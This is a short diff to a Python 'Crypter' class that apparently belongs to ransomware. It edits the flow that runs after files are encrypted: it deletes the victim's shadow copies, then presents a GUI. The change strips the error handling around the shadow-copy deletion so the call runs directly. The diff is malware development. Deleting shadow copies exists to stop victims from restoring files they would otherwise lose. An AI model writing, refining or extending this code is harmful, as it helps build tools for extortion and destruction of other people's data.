@@ -55,12 +55,7 @@ class Crypter(Base.Base):
       if not os.path.isfile(self.encrypted_file_list):
           return
       # Delete Shadow Copies
-      try:
-          self.__delete_shadow_files()
-      except Exception as ex:
-          fh = open("error.txt", "w")
-          fh.write(traceback.format_exc())
-          fh.close()
+      self.__delete_shadow_files()
       # Present GUI
       self.start_gui()
     # ALREADY ENCRYPTED
